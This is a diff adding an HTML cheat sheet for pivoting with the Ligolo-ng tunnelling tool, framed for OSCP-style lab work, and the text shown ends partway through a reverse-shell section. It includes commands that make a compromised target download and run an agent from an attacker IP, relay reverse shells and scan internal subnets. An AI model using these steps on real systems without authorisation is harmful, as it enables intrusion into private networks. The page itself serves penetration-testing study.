@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ligolo-ng Cheat Sheet</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10;
+    --bg2: #0d1117;
+    --bg3: #161b22;
+    --bg4: #1c2128;
+    --border: #21262d;
+    --border2: #30363d;
+    --accent: #00d4ff;
+    --accent2: #7c3aed;
+    --accent3: #10b981;
+    --accent4: #f59e0b;
+    --accent5: #ef4444;
+    --text: #e6edf3;
+    --text2: #8b949e;
+    --text3: #6e7681;
+    --code-bg: #161b22;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    line-height: 1.5;
+    padding: 0;
+    min-height: 100vh;
+  }
+
+  /* Animated grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .page {
+    position: relative;
+    z-index: 1;
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 24px 20px;
+  }
+
+  /* ── HEADER ── */
+  header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 32px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo-icon {
+    width: 48px;
+    height: 48px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    flex-shrink: 0;
+    box-shadow: 0 0 20px rgba(0,212,255,0.3);
+  }
+
+  .logo-text h1 {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 26px;
+    font-weight: 400;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-shadow: 0 0 20px rgba(0,212,255,0.5);
+    line-height: 1;
+  }
+
+  .logo-text p {
+    color: var(--text2);
+    font-size: 12px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-top: 3px;
+  }
+
+  .badges {
+    display: flex;
+    gap: 8px;
+    margin-left: auto;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    padding: 4px 12px;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .badge-blue { background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3); color: var(--accent); }
+  .badge-green { background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); color: var(--accent3); }
+  .badge-purple { background: rgba(124,58,237,0.1); border: 1px solid rgba(124,58,237,0.3); color: #a78bfa; }
+
+  /* ── SCENARIO BOX ── */
+  .scenario-box {
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-left: 3px solid var(--accent);
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 28px;
+    display: flex;
+    gap: 32px;
+    flex-wrap: wrap;
+  }
+
+  .scenario-box h3 {
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--text3);
+    margin-bottom: 10px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .ip-grid { display: flex; flex-direction: column; gap: 6px; }
+
+  .ip-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+  }
+
+  .ip-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .dot-blue { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+  .dot-green { background: var(--accent3); box-shadow: 0 0 6px var(--accent3); }
+  .dot-purple { background: #a78bfa; box-shadow: 0 0 6px #a78bfa; }
+  .dot-amber { background: var(--accent4); box-shadow: 0 0 6px var(--accent4); }
+  .dot-red { background: var(--accent5); box-shadow: 0 0 6px var(--accent5); }
+
+  .ip-label { color: var(--text2); font-size: 11px; }
+  .ip-val { color: var(--text); }
+
+  /* ── GRID LAYOUT ── */
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    margin-bottom: 16px;
+  }
+
+  .grid-2 { grid-template-columns: repeat(2, 1fr); }
+  .grid-1 { grid-template-columns: 1fr; }
+
+  /* ── CARD ── */
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .card:hover { border-color: var(--border2); }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg3);
+  }
+
+  .card-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    font-weight: 700;
+    color: var(--text3);
+    min-width: 22px;
+  }
+
+  .card-icon { font-size: 16px; flex-shrink: 0; }
+
+  .card-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    flex: 1;
+  }
+
+  .card-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 3px;
+  }
+
+  .tag-kali { background: rgba(0,212,255,0.1); color: var(--accent); border: 1px solid rgba(0,212,255,0.2); }
+  .tag-target { background: rgba(239,68,68,0.1); color: var(--accent5); border: 1px solid rgba(239,68,68,0.2); }
+  .tag-session { background: rgba(16,185,129,0.1); color: var(--accent3); border: 1px solid rgba(16,185,129,0.2); }
+  .tag-both { background: rgba(124,58,237,0.1); color: #a78bfa; border: 1px solid rgba(124,58,237,0.2); }
+
+  .card-body { padding: 14px 16px; }
+
+  /* ── CODE BLOCK ── */
+  .cmd-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 14px;
+    margin: 6px 0;
+    position: relative;
+    overflow-x: auto;
+  }
+
+  .cmd-block:first-child { margin-top: 0; }
+
+  .cmd-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 5px;
+  }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12.5px;
+    line-height: 1.7;
+    color: var(--text);
+    display: block;
+    white-space: pre;
+  }
+
+  code .kw { color: var(--accent); }          /* cyan — commands */
+  code .ip { color: var(--accent3); }          /* green — IPs */
+  code .port { color: var(--accent4); }        /* amber — ports */
+  code .flag { color: #a78bfa; }               /* purple — flags */
+  code .comment { color: var(--text3); font-style: italic; }
+  code .path { color: #fb923c; }               /* orange — paths */
+  code .var { color: #f472b6; }                /* pink — variables */
+
+  .note {
+    display: flex;
+    gap: 8px;
+    background: rgba(245,158,11,0.07);
+    border: 1px solid rgba(245,158,11,0.2);
+    border-radius: 5px;
+    padding: 8px 12px;
+    margin-top: 10px;
+    font-size: 12.5px;
+    color: #d97706;
+    line-height: 1.5;
+  }
+
+  .note-icon { flex-shrink: 0; margin-top: 1px; }
+
+  .note-blue {
+    background: rgba(0,212,255,0.05);
+    border-color: rgba(0,212,255,0.2);
+    color: var(--accent);
+  }
+
+  .note-green {
+    background: rgba(16,185,129,0.05);
+    border-color: rgba(16,185,129,0.2);
+    color: var(--accent3);
+  }
+
+  .step-label {
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text3);
+    margin-bottom: 6px;
+    margin-top: 12px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .step-label:first-child { margin-top: 0; }
+
+  /* ── SECTION HEADER ── */
+  .section-hdr {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin: 28px 0 14px;
+  }
+
+  .section-hdr-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border2), transparent);
+  }
+
+  .section-hdr h2 {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    color: var(--text3);
+    white-space: nowrap;
+  }
+
+  /* ── FLOW DIAGRAM ── */
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    padding: 12px 0 6px;
+    overflow-x: auto;
+  }
+
+  .flow-node {
+    background: var(--bg4);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 6px 12px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11.5px;
+    white-space: nowrap;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 2px;
+  }
+
+  .flow-node .fn-title { color: var(--text); font-weight: 500; }
+  .flow-node .fn-ip { color: var(--text3); font-size: 10px; }
+  .flow-arrow { color: var(--text3); font-size: 16px; flex-shrink: 0; }
+
+  .fn-blue { border-color: rgba(0,212,255,0.4); }
+  .fn-blue .fn-title { color: var(--accent); }
+  .fn-red { border-color: rgba(239,68,68,0.4); }
+  .fn-red .fn-title { color: var(--accent5); }
+  .fn-green { border-color: rgba(16,185,129,0.4); }
+  .fn-green .fn-title { color: var(--accent3); }
+  .fn-amber { border-color: rgba(245,158,11,0.4); }
+  .fn-amber .fn-title { color: var(--accent4); }
+
+  /* ── INLINE HIGHLIGHT ── */
+  .hl { color: var(--accent); font-family: 'JetBrains Mono', monospace; font-size: 12.5px; }
+  .hl-g { color: var(--accent3); }
+  .hl-a { color: var(--accent4); }
+  .hl-p { color: #a78bfa; }
+
+  /* ── QUICK REF TABLE ── */
+  .qref-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    margin-top: 6px;
+  }
+
+  .qref-table th {
+    text-align: left;
+    padding: 7px 12px;
+    background: var(--bg4);
+    color: var(--text3);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border2);
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 600;
+  }
+
+  .qref-table td {
+    padding: 7px 12px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+    line-height: 1.6;
+  }
+
+  .qref-table tr:last-child td { border-bottom: none; }
+  .qref-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+  .qref-table td:first-child { color: var(--accent); white-space: nowrap; }
+  .qref-table td:last-child { color: var(--text2); font-family: 'Rajdhani', sans-serif; font-size: 13px; }
+
+  /* ── FOOTER ── */
+  footer {
+    margin-top: 36px;
+    padding-top: 16px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  footer p {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--text3);
+  }
+
+  .pulse {
+    display: inline-block;
+    width: 6px; height: 6px;
+    background: var(--accent3);
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+    vertical-align: middle;
+    margin-right: 6px;
+    box-shadow: 0 0 6px var(--accent3);
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  /* card accent colors */
+  .card-accent-blue .card-header { border-left: 3px solid var(--accent); }
+  .card-accent-green .card-header { border-left: 3px solid var(--accent3); }
+  .card-accent-purple .card-header { border-left: 3px solid #a78bfa; }
+  .card-accent-amber .card-header { border-left: 3px solid var(--accent4); }
+  .card-accent-red .card-header { border-left: 3px solid var(--accent5); }
+
+  .card-title-blue { color: var(--accent); }
+  .card-title-green { color: var(--accent3); }
+  .card-title-purple { color: #a78bfa; }
+  .card-title-amber { color: var(--accent4); }
+  .card-title-red { color: var(--accent5); }
+
+  @media (max-width: 1100px) {
+    .grid { grid-template-columns: repeat(2, 1fr); }
+  }
+  @media (max-width: 700px) {
+    .grid, .grid-2 { grid-template-columns: 1fr; }
+    .scenario-box { flex-direction: column; gap: 16px; }
+    header { flex-direction: column; align-items: flex-start; }
+    .badges { margin-left: 0; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- HEADER -->
+  <header>
+    <div class="logo">
+      <div class="logo-icon">🕸️</div>
+      <div class="logo-text">
+        <h1>LIGOLO-NG</h1>
+        <p>Pivoting &amp; Tunneling Cheat Sheet</p>
+      </div>
+    </div>
+    <div class="badges">
+      <span class="badge badge-blue">v0.6.2+</span>
+      <span class="badge badge-green">OSCP-Ready</span>
+      <span class="badge badge-purple">No Proxychains</span>
+    </div>
+  </header>
+
+  <!-- SCENARIO REFERENCE -->
+  <div class="scenario-box">
+    <div>
+      <h3>// Scenario Variables</h3>
+      <div class="ip-grid">
+        <div class="ip-row">
+          <div class="ip-dot dot-blue"></div>
+          <span class="ip-val">192.168.45.176</span>
+          <span class="ip-label">→ Kali / TUN0 (Attacker)</span>
+        </div>
+        <div class="ip-row">
+          <div class="ip-dot dot-red"></div>
+          <span class="ip-val">192.168.1.13</span>
+          <span class="ip-label">→ Target #1 External IP</span>
+        </div>
+        <div class="ip-row">
+          <div class="ip-dot dot-green"></div>
+          <span class="ip-val">10.10.10.10</span>
+          <span class="ip-label">→ Target #1 Internal IP → subnet 10.10.10.0/24</span>
+        </div>
+      </div>
+    </div>
+    <div>
+      <h3>// Double Pivot Variables</h3>
+      <div class="ip-grid">
+        <div class="ip-row">
+          <div class="ip-dot dot-amber"></div>
+          <span class="ip-val">10.10.10.13</span>
+          <span class="ip-label">→ Target #2 External IP (in 1st internal net)</span>
+        </div>
+        <div class="ip-row">
+          <div class="ip-dot dot-purple"></div>
+          <span class="ip-val">11.11.11.11</span>
+          <span class="ip-label">→ Target #2 Internal IP → subnet 11.11.11.0/24</span>
+        </div>
+      </div>
+    </div>
+    <div>
+      <h3>// Default Ports</h3>
+      <div class="ip-grid">
+        <div class="ip-row">
+          <div class="ip-dot dot-blue"></div>
+          <span class="ip-val">11601</span>
+          <span class="ip-label">→ Ligolo proxy default listen port</span>
+        </div>
+        <div class="ip-row">
+          <div class="ip-dot dot-green"></div>
+          <span class="ip-val">240.0.0.1</span>
+          <span class="ip-label">→ Magic IP → agent's own localhost</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION: INITIAL SETUP -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>01 — Initial Setup (Kali)</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="grid">
+
+    <!-- Card: TUN Interface -->
+    <div class="card card-accent-blue">
+      <div class="card-header">
+        <span class="card-num">01</span>
+        <span class="card-icon">🔌</span>
+        <span class="card-title card-title-blue">Create TUN Interface</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Create &amp; bring up</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip tuntap add</span> user root mode tun <span class="path">ligolo</span>
+<span class="kw">sudo ip link set</span> <span class="path">ligolo</span> up
+<span class="comment"># Verify it exists</span>
+<span class="kw">ip link show</span> <span class="path">ligolo</span></code>
+        </div>
+        <div class="note">
+          <span class="note-icon">⚠️</span>
+          <span>Requires <strong>sudo</strong>. Only needs to be done once per session. Won't persist across reboots.</span>
+        </div>
+        <div class="step-label">For double pivot — create tunnel2</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip tuntap add</span> user root mode tun <span class="path">tunnel2</span>
+<span class="kw">sudo ip link set</span> <span class="path">tunnel2</span> up</code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Start Proxy -->
+    <div class="card card-accent-blue">
+      <div class="card-header">
+        <span class="card-num">02</span>
+        <span class="card-icon">🖥️</span>
+        <span class="card-title card-title-blue">Start Proxy Server</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Self-signed cert (labs / OSCP)</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo</span> ./proxy <span class="flag">-selfcert</span>
+<span class="comment"># Listens on 0.0.0.0:11601 by default</span></code>
+        </div>
+        <div class="step-label">Custom port</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo</span> ./proxy <span class="flag">-selfcert</span> <span class="flag">-laddr</span> <span class="ip">0.0.0.0</span>:<span class="port">443</span></code>
+        </div>
+        <div class="step-label">Trusted cert (real engagements)</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo</span> ./proxy <span class="flag">-certfile</span> <span class="path">ligolo-ng.crt</span> \
+             <span class="flag">-keyfile</span>  <span class="path">ligolo-ng.key</span></code>
+        </div>
+        <div class="step-label">If installed via apt (Kali 2024.2+)</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo apt install</span> ligolo-ng
+ligolo-proxy <span class="flag">-selfcert</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Transfer &amp; Run Agent -->
+    <div class="card card-accent-red">
+      <div class="card-header">
+        <span class="card-num">03</span>
+        <span class="card-icon">📤</span>
+        <span class="card-title card-title-red">Transfer &amp; Run Agent</span>
+        <span class="card-tag tag-target">TARGET</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Serve from Kali</div>
+        <div class="cmd-block">
+<code><span class="kw">python3 -m http.server</span> <span class="port">80</span></code>
+        </div>
+        <div class="step-label">Download on Linux target</div>
+        <div class="cmd-block">
+<code>wget <span class="ip">http://192.168.45.176</span>/<span class="path">agent</span>
+<span class="kw">chmod +x</span> <span class="path">agent</span>
+./<span class="path">agent</span> <span class="flag">-connect</span> <span class="ip">192.168.45.176</span>:<span class="port">11601</span> <span class="flag">-ignore-cert</span></code>
+        </div>
+        <div class="step-label">Download on Windows target</div>
+        <div class="cmd-block">
+<code><span class="kw">certutil</span> <span class="flag">-urlcache -split -f</span> <span class="ip">http://192.168.45.176/</span><span class="path">agent.exe</span> <span class="path">agent.exe</span>
+<span class="comment"># Or:</span>
+<span class="kw">powershell</span> wget <span class="ip">http://192.168.45.176</span>/<span class="path">agent.exe</span> <span class="flag">-o</span> <span class="path">agent.exe</span>
+.\<span class="path">agent.exe</span> <span class="flag">-connect</span> <span class="ip">192.168.45.176</span>:<span class="port">11601</span> <span class="flag">-ignore-cert</span></code>
+        </div>
+        <div class="note note-green">
+          <span class="note-icon">✅</span>
+          <span>Agent does <strong>NOT</strong> require admin/root privileges on the target.</span>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /grid -->
+
+  <!-- SECTION: SESSION & TUNNEL -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>02 — Session &amp; Tunnel (Proxy Console)</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="grid">
+
+    <!-- Card: Session Management -->
+    <div class="card card-accent-green">
+      <div class="card-header">
+        <span class="card-num">04</span>
+        <span class="card-icon">🎛️</span>
+        <span class="card-title card-title-green">Session Management</span>
+        <span class="card-tag tag-session">PROXY CONSOLE</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Select a session</div>
+        <div class="cmd-block">
+<code>ligolo-ng » <span class="kw">session</span>
+<span class="comment"># Use arrow keys to choose, then Enter</span></code>
+        </div>
+        <div class="step-label">Enumerate agent's interfaces</div>
+        <div class="cmd-block">
+<code>[Agent: user@target] » <span class="kw">ifconfig</span>
+<span class="comment"># Note internal subnets not reachable from Kali</span></code>
+        </div>
+        <div class="step-label">Start tunnel on default interface</div>
+        <div class="cmd-block">
+<code>[Agent: user@target] » <span class="kw">start</span></code>
+        </div>
+        <div class="step-label">Start tunnel on named interface</div>
+        <div class="cmd-block">
+<code>[Agent: user@target] » <span class="kw">start</span> <span class="flag">--tun</span> <span class="path">tunnel2</span></code>
+        </div>
+        <div class="step-label">Stop tunnel</div>
+        <div class="cmd-block">
+<code>[Agent: user@target] » <span class="kw">stop</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Routing -->
+    <div class="card card-accent-green">
+      <div class="card-header">
+        <span class="card-num">05</span>
+        <span class="card-icon">🗺️</span>
+        <span class="card-title card-title-green">Add Routes (Kali Terminal)</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Route internal subnet via ligolo</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip route add</span> <span class="ip">10.10.10.0/24</span> dev <span class="path">ligolo</span></code>
+        </div>
+        <div class="step-label">Route second internal subnet via tunnel2</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip route add</span> <span class="ip">11.11.11.0/24</span> dev <span class="path">tunnel2</span></code>
+        </div>
+        <div class="step-label">Access agent's localhost (jumpbox ports)</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip route add</span> <span class="ip">240.0.0.1/32</span> dev <span class="path">ligolo</span>
+<span class="comment"># 240.0.0.1 = magic IP for agent's 127.0.0.1</span>
+<span class="kw">nmap</span> <span class="flag">-p-</span> <span class="ip">240.0.0.1</span></code>
+        </div>
+        <div class="step-label">Verify routes</div>
+        <div class="cmd-block">
+<code><span class="kw">ip route</span> | grep ligolo</code>
+        </div>
+        <div class="note note-blue">
+          <span class="note-icon">💡</span>
+          <span>Run route commands in a <strong>new terminal</strong> — leave the proxy console open.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Test & Verify -->
+    <div class="card card-accent-green">
+      <div class="card-header">
+        <span class="card-num">06</span>
+        <span class="card-icon">✅</span>
+        <span class="card-title card-title-green">Verify Tunnel</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Ping internal host</div>
+        <div class="cmd-block">
+<code><span class="kw">ping</span> <span class="ip">10.10.10.1</span></code>
+        </div>
+        <div class="step-label">SMB sweep</div>
+        <div class="cmd-block">
+<code><span class="kw">netexec smb</span> <span class="ip">10.10.10.0/24</span>
+<span class="comment"># Or:</span>
+<span class="kw">crackmapexec smb</span> <span class="ip">10.10.10.0/24</span></code>
+        </div>
+        <div class="step-label">Nmap scan (unprivileged for ICMP)</div>
+        <div class="cmd-block">
+<code><span class="kw">nmap</span> <span class="flag">--unprivileged -sT -Pn</span> <span class="ip">10.10.10.10</span>
+<span class="comment"># No proxychains needed!</span></code>
+        </div>
+        <div class="step-label">Quick host discovery</div>
+        <div class="cmd-block">
+<code><span class="kw">nmap</span> <span class="flag">-v -n --unprivileged -T4</span> <span class="ip">10.10.10.0/24</span></code>
+        </div>
+        <div class="note">
+          <span class="note-icon">⚠️</span>
+          <span>Use <span class="hl">--unprivileged</span> or <span class="hl">-sT</span> with nmap — raw SYN scans don't work through the tunnel.</span>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /grid -->
+
+  <!-- FLOW DIAGRAM: Single Pivot -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>03 — Double Pivot Flow</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="card" style="margin-bottom:16px;">
+    <div class="card-body" style="padding: 16px 20px;">
+      <div class="flow">
+        <div class="flow-node fn-blue">
+          <span class="fn-title">🖥️ KALI</span>
+          <span class="fn-ip">192.168.45.176 (tun0)</span>
+          <span class="fn-ip">proxy -selfcert</span>
+        </div>
+        <span class="flow-arrow">◀──▶</span>
+        <div class="flow-node fn-red">
+          <span class="fn-title">🎯 TARGET #1</span>
+          <span class="fn-ip">ext: 192.168.1.13</span>
+          <span class="fn-ip">int: 10.10.10.10</span>
+        </div>
+        <span class="flow-arrow">──▶</span>
+        <div class="flow-node fn-green">
+          <span class="fn-title">🌐 10.10.10.0/24</span>
+          <span class="fn-ip">Route via ligolo</span>
+          <span class="fn-ip">listener on :11601</span>
+        </div>
+        <span class="flow-arrow">◀──▶</span>
+        <div class="flow-node fn-amber">
+          <span class="fn-title">🎯 TARGET #2</span>
+          <span class="fn-ip">ext: 10.10.10.13</span>
+          <span class="fn-ip">int: 11.11.11.11</span>
+        </div>
+        <span class="flow-arrow">──▶</span>
+        <div class="flow-node fn-green">
+          <span class="fn-title">🌐 11.11.11.0/24</span>
+          <span class="fn-ip">Route via tunnel2</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION: DOUBLE PIVOT -->
+  <div class="grid grid-2">
+
+    <!-- Card: First Pivot Listener -->
+    <div class="card card-accent-amber">
+      <div class="card-header">
+        <span class="card-num">07</span>
+        <span class="card-icon">🔗</span>
+        <span class="card-title card-title-amber">First Pivot — Listener for 2nd Agent</span>
+        <span class="card-tag tag-session">PROXY CONSOLE</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">On session of TARGET #1 — allow 2nd agent to connect back</div>
+        <div class="cmd-block">
+<code><span class="comment"># Add listener so 2nd target can reach Kali's proxy</span>
+[Agent: user@target1] » <span class="kw">listener_add</span> \
+  <span class="flag">--addr</span> <span class="ip">0.0.0.0</span>:<span class="port">11601</span> \
+  <span class="flag">--to</span> <span class="ip">127.0.0.1</span>:<span class="port">11601</span> <span class="flag">--tcp</span>
+
+<span class="comment"># Verify it's active</span>
+[Agent: user@target1] » <span class="kw">listener_list</span></code>
+        </div>
+        <div class="step-label">Run agent on TARGET #2 — connect through TARGET #1</div>
+        <div class="cmd-block">
+<code>.\<span class="path">agent.exe</span> <span class="flag">-connect</span> <span class="ip">10.10.10.10</span>:<span class="port">11601</span> <span class="flag">-ignore-cert</span>
+<span class="comment"># 10.10.10.10 = TARGET #1 internal IP (not Kali!)</span></code>
+        </div>
+        <div class="step-label">Back in proxy — select new session &amp; start tunnel2</div>
+        <div class="cmd-block">
+<code>ligolo-ng » <span class="kw">session</span>  <span class="comment"># select target #2 session</span>
+[Agent: user@target2] » <span class="kw">start</span> <span class="flag">--tun</span> <span class="path">tunnel2</span></code>
+        </div>
+        <div class="step-label">Add route for 2nd internal network</div>
+        <div class="cmd-block">
+<code><span class="comment"># In a new Kali terminal:</span>
+<span class="kw">sudo ip route add</span> <span class="ip">11.11.11.0/24</span> dev <span class="path">tunnel2</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Port Forwarding Listeners -->
+    <div class="card card-accent-purple">
+      <div class="card-header">
+        <span class="card-num">08</span>
+        <span class="card-icon">↕️</span>
+        <span class="card-title card-title-purple">Port Forwarding via Listeners</span>
+        <span class="card-tag tag-session">PROXY CONSOLE</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Syntax — forward target port → Kali port</div>
+        <div class="cmd-block">
+<code>[Agent] » <span class="kw">listener_add</span> \
+  <span class="flag">--addr</span> <span class="ip">0.0.0.0</span>:<span class="port">&lt;AGENT_PORT&gt;</span> \
+  <span class="flag">--to</span> <span class="ip">127.0.0.1</span>:<span class="port">&lt;KALI_PORT&gt;</span> <span class="flag">--tcp</span>
+<span class="comment"># Traffic on AGENT_PORT → forwarded to KALI_PORT</span></code>
+        </div>
+        <div class="step-label">Common listeners for whitelisted ports</div>
+        <div class="cmd-block">
+<code><span class="comment"># HTTP server listener</span>
+[Agent] » <span class="kw">listener_add</span> <span class="flag">--addr</span> <span class="ip">0.0.0.0</span>:<span class="port">80</span> <span class="flag">--to</span> <span class="ip">127.0.0.1</span>:<span class="port">80</span> <span class="flag">--tcp</span>
+
+<span class="comment"># HTTPS/reverse shell listener</span>
+[Agent] » <span class="kw">listener_add</span> <span class="flag">--addr</span> <span class="ip">0.0.0.0</span>:<span class="port">443</span> <span class="flag">--to</span> <span class="ip">127.0.0.1</span>:<span class="port">443</span> <span class="flag">--tcp</span></code>
+        </div>
+        <div class="step-label">File transfer from internal host</div>
+        <div class="cmd-block">
+<code><span class="comment"># On TARGET #2 — download from Kali via TARGET #1's IP</span>
+<span class="kw">wget</span> <span class="ip">http://10.10.10.10</span>/<span class="path">tool.exe</span> <span class="flag">-outfile</span> <span class="path">tool.exe</span>
+<span class="comment"># Or PowerShell:</span>
+Invoke-WebRequest <span class="flag">-Uri</span> <span class="ip">http://10.10.10.10</span>:<span class="port">80</span>/<span class="path">tool.exe</span> <span class="flag">-OutFile</span> <span class="path">tool.exe</span></code>
+        </div>
+        <div class="step-label">Manage listeners</div>
+        <div class="cmd-block">
+<code>[Agent] » <span class="kw">listener_list</span>          <span class="comment"># show active</span>
+[Agent] » <span class="kw">listener_stop</span> <span class="var">0</span>         <span class="comment"># stop by ID</span></code>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /grid-2 -->
+
+  <!-- SECTION: REVERSE SHELLS & FILE OPS -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>04 — Reverse Shells via Ligolo</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="grid grid-2">
+
+    <!-- Card: Reverse Shell Setup -->
+    <div class="card card-accent-red">
+      <div class="card-header">
+        <span class="card-num">09</span>
+        <span class="card-icon">🐚</span>
+        <span class="card-title card-title-red">Catch Reverse Shell from Internal</span>
+        <span class="card-tag tag-both">BOTH</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Step 1 — Add listener in proxy (forward agent port → Kali nc)</div>
+        <div class="cmd-block">
+<code>[Agent: user@target1] » <span class="kw">listener_add</span> \
+  <span class="flag">--addr</span> <span class="ip">0.0.0.0</span>:<span class="port">8888</span> \
+  <span class="flag">--to</span> <span class="ip">127.0.0.1</span>:<span class="port">443</span> <span class="flag">--tcp</span>
+<span class="comment"># port 8888 on target → port 443 on Kali</span></code>
+        </div>
